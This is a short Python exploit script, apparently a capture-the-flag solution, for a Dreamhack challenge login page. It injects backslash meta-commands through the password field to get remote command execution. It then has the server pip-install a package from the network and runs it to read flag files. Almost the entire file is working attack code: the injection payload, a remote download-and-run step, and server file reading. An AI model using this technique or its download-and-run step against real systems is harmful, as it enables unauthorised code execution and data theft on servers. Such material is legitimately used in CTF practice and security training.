import requests
import re
import html
import base64

url = "http://host3.dreamhack.games:18296/"
s = requests.Session()

def rce(cmd):
	payload = """\\g \\d END \\g system echo username END system %s END -- """ % cmd
	
	res = s.post(f'{url}/login', data={
		'username': '\\',
		'password': payload
	})

	try:
		resp = re.findall(r'Welcome,(.+?)!</p>', res.text)[0].strip()
		return html.unescape(resp)
	except:
		return res.text

# install exploit package
rce('pip install dreamhack-solve')

# rce
cmd = 'cat /flag*'

flag = rce('python -m dreamhack-solve %s' % base64.b64encode(cmd.encode()).decode().rstrip('='))
print("Flag:", flag)